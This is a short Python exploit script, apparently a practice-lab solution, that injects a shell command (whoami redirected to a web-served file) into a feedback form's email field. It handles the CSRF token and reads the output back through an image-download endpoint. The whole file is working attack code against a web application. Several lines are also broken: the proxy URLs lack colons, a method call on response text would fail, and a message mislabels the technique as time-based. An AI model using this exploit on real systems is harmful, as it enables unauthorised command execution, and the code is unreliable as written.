import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url+'/feedback', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text,  'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def check_cammand_injection(url, s):
    feedback_path_url = url + '/feedback/submit'
    command_injection = 'test@test.ca whoami > /var/www/images/output4.txt'
    csrf_token= get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email':command_injection, 'subject': 'Test', 'message': 'Test'}
    r1 = s.post(feedback_path_url, data=data , verify=False, proxies= proxies)
    print("(+) Verifying if command injection exploit verified...")   
    #verifying command injection exploit
    file_path = '/image?filename=output4.txt'
    r2 = s.get(url+ file_path, verify=False, proxies=proxies)
    if (r2.status_code == 200):
        print("(+) Verified command injection and Exploit successful")
        print("(+) Output of the command injection exploit is... ")
        r2.text()
    else:
        print("(+) Exploit failed and unable to verify command injection")

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)        
    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to time based command injection")

    s = requests.Session()
    check_cammand_injection(url,s) 

if __name__ == '__main__':
    main()